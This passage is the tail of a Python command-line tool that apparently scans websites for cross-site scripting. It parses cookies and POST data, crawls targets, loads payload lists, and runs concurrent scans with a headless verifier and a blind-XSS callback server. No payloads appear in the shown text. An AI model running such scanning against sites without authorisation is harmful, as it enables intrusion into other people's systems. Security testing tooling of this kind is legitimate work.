        print(f"[🤖] Loading ML model from {args.ml_model}...")
        ml_classifier.load_model(args.ml_model)
    elif args.ml_model:
        print(f"[⚠️] ML model file not found: {args.ml_model}")
    
   
    if args.method == "POST" and not args.data:
        print("[!] POST method requires --data parameter")
        sys.exit(1)
    
    if args.json and args.method != "POST":
        print("[!] --json flag is only valid with POST method")
        sys.exit(1)
    
    
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
    
    
    targets = []
    
    if args.crawl:
        print("[🌐] Starting intelligent crawler...")
       
        crawler = Crawler(
            start_url=args.url,
            max_depth=args.max_depth,
            max_urls=args.max_urls,
            headers=HEADERS,
            timeout=TIMEOUT,
            cookies=cookies,
            osint=args.osint
        )
        
       
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        targets = loop.run_until_complete(crawler.crawl())
        loop.close()
        
        print(f"[✅] Crawler found {len(targets)} potential targets")
    else:
      
        if args.method == "POST":
            
            if args.json:
                try:
                    post_data = json.loads(args.data)
                except json.JSONDecodeError:
                    print("[!] Invalid JSON in --data parameter")
                    sys.exit(1)
            else:
                
                from urllib.parse import parse_qs
                parsed = parse_qs(args.data)
                post_data = {k: v[0] if v else '' for k, v in parsed.items()}
            
            targets.append({
                'url': args.url,
                'method': 'POST',
                'data': post_data,
                'json': args.json,
                'context': {'source': 'manual'}
            })
        else:  # GET
            targets.append({
                'url': args.url,
                'method': 'GET',
                'data': None,
                'json': False,
                'context': {'source': 'manual'}
            })
    
    # --- Load payloads ---
    payloads_to_use = PAYLOADS
    source_desc = "built-in payloads"
    
    if args.payloads_file:
        file_payloads = load_payloads_from_file(args.payloads_file)
        if args.append:
            payloads_to_use = PAYLOADS + file_payloads
            source_desc = f"built-in + {len(file_payloads)} from file"
        else:
            payloads_to_use = file_payloads
            source_desc = f"only from file ({len(file_payloads)})"
    
    print(f"[+] Using: {source_desc}")
    
    # --- Scan parameters ---
    use_color = args.color
    custom_delay = args.delay
    if custom_delay <= 0:
        print("[!] Delay must be positive. Using default 0.6.")
        custom_delay = 0.6
    
    concurrency = args.concurrency
    if concurrency < 1:
        print("[!] Concurrency must be at least 1. Using default 5.")
        concurrency = 20
    
    # --- Start scanning ---
    try:
        asyncio.run(sniper(targets, payloads_to_use, use_color, custom_delay, concurrency))
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(0)
    finally:
        # Cleanup professional components
        if headless_verifier:
            asyncio.create_task(headless_verifier.close())
        if blind_xss_server:
            blind_xss_server.stop()

if __name__ == "__main__":
    main()
